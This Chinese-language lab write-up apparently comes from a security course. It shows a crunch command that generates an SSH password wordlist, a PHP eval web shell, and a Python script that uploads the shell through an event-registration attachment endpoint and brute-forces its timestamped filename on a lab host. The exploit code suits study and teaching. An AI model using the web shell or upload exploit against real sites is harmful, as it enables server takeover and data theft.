## 使用crunch、hydra暴力破解ssh服务

### 使用crunch工具生成密钥

在操作机使用相关工具，要求从字符串“hacker +123456”中，随机选9个字符进行排列组合，生成密码字典文件password.txt。

```apache
crunch  9 9 123456 -t hacker%%%  -o password.txt
```

![1712814371571](/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712814371571.png)

## 获取目标网站的webshell权限，控制目标机，获得敏感信息

在操作机创建脚本，建立一个上传表单；建立一个php文件，作为一句话木马。通过上传表单上传一句话。

该网站网址是 `http://192.168.1.4/index.php`

![1712816929035](/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712816929035.png)

我们选择这样的一句话木马：

```apache
<?php eval($_GET['cmd']); ?>
```

其意义为执行GET请求中cmd的参数

我们将这这个一句话木马保存到 `webshell.php`中。

![1712818096295](/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712818096295.png)

在浏览器另外一个页面快速打开 `http://192.168.1.4/index.php?module=eventregistration&action=eventsCalendar`，获得时间戳，分析可知上传的文件名以时间戳+下划线+原文件名称来命名。

![1712817428681](/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712817428681.png)

我们选择用python编写脚本

```python
import  requests
import re

dir_url = "http://192.168.1.4"
tmp_url = f"{dir_url}/tmp"
base_url = f"{dir_url}/index.php"
upload_url = f"{base_url}?module=eventregistration&action=emailRegistrants&action=emailRegistrants&email_addresses=123456789@123.com&email_message=1&email_subject=1"
timestamp_url = f"{base_url}?module=eventregistration&action=eventsCalendar"
webshell_path = "/Desktop/webshell.php"

def upload_file():
    files = {
        "attach": open(webshell_path,"rb"),
        "filename":webshell_path
    }

    requests.post(url = upload_url, files= files)

def get_timestamp():
    res = requests.get(url=timestamp_url)
    if res.status_code != 200:
        raise  requests.exceptions.ConnectionError(f"Connection with {timestamp_url} failed")
    else:
        return int(re.search("History\\.push.+?rel:\\'(\d+)?\\'",res.text).group(1))

def find_webshell_url(timestamp, max_number =10000):
    for i in range(max_number):
        test_url = f"{tmp_url}/{timestamp-i}_{webshell_path}"
        res =requests.get(url=test_url)
        if res.status_code == 200:
            return test_url

    return ""

if __name__ == "__main__":
    upload_file()

    timestamp = get_timestamp()
    print(f"current timestamp: {timestamp}")

    webshell_url = find_webshell_url(timestamp)
    if webshell_url:
        print(f"webshell url: {webshell_url}")
    else:
        print("fail to find webshell url")
```
